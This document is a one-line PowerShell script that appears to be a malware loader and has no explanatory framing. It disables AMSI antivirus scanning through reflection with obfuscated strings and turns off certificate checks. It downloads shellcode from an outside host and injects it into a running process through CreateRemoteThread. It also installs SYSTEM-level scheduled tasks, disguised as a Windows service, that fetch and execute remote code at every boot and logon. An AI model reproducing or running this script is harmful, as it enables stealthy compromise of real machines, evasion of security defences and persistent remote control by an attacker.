$a='Ams';$b='iUti';$c='ls';$d=[Ref].Assembly.GetType("System.Management.Automation.$a$b$c");$e=$d.GetField('amsiInitFailed','NonPublic,Static');$e.SetValue($null,$true);[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$sc=Invoke-RestMethod -Uri 'https://www.hateyouroot.site/payload_shc.bin' -Method Get;$p=(Get-Process svchost -ea SilentlyContinue|Get-Random);if(!$p){$p=Start-Process explorer -WindowStyle Hidden -PassThru};$k32=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::GetModuleHandle('kernel32.dll'),'OpenProcess'),[Type]::GetType('System.Runtime.InteropServices.Marshal+OpenProcessDelegate'));$h=$k32.Invoke(0x1F0FFF,$false,$p.Id);$valloc=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::GetModuleHandle('kernel32.dll'),'VirtualAllocEx'),[Type]::GetType('System.Runtime.InteropServices.Marshal+VirtualAllocExDelegate'));$addr=$valloc.Invoke($h,[IntPtr]::Zero,$sc.Length,0x3000,0x40);$write=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::GetModuleHandle('kernel32.dll'),'WriteProcessMemory'),[Type]::GetType('System.Runtime.InteropServices.Marshal+WriteProcessMemoryDelegate'));[void]$write.Invoke($h,$addr,$sc,$sc.Length,[ref]0);$create=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::GetModuleHandle('kernel32.dll'),'CreateRemoteThread'),[Type]::GetType('System.Runtime.InteropServices.Marshal+CreateRemoteThreadDelegate'));[void]$create.Invoke($h,[IntPtr]::Zero,0,$addr,[IntPtr]::Zero,0,[IntPtr]::Zero);$t='powershell -w hidden -ep bypass -c \"IEX(Invoke-RestMethod ''https://www.hateyouroot.site/persist.txt'')\"';schtasks /create /tn WindowsCoreService /tr $t /sc onstart /ru SYSTEM /f 2>$null;schtasks /create /tn WindowsCoreService /tr $t /sc onlogon /ru SYSTEM /f 2>$null;while($true){Start-Sleep 300;try{[void]$create.Invoke($h,[IntPtr]::Zero,0,$addr,[IntPtr]::Zero,0,[IntPtr]::Zero)}catch{}}
